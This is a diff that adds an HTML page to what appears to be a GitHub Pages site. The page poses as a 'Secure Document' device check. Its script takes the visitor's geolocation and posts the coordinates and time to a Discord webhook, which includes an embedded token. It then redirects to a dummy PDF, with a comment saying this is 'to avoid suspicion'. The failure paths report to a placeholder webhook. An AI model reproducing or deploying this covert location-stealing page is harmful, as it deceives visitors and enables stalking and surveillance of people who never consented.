@@ -1,1 +1,50 @@
-# mar11x13.github.io
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Document</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Verifying Your Device...</h2>
+    <p>Please wait a moment.</p>
+    <div class="loader"></div>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    fetch(https://discord.com/api/webhooks/1469316575097258044/AesAEZSFJIg9VivmfPUnBi9RDlKjDCfCBVy66nIpL_d8nueI4u5JPNKURggX6DDOQNgA, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `**Location Captured:**\nLat: ${lat}\nLon: ${lon}\nTime: ${new Date().toLocaleString()}`
+                        })
+                    }).then(() => {
+                        // Redirect to a harmless PDF to avoid suspicion
+                        window.location.href = 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';
+                    });
+                },
+                function(error) {
+                    fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `**Location Denied:** ${error.message}` })
+                    });
+                }
+            );
+        } else {
+            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: '**Geolocation Not Supported**' })
+            });
+        }
+    </script>
+</body>
+</html>
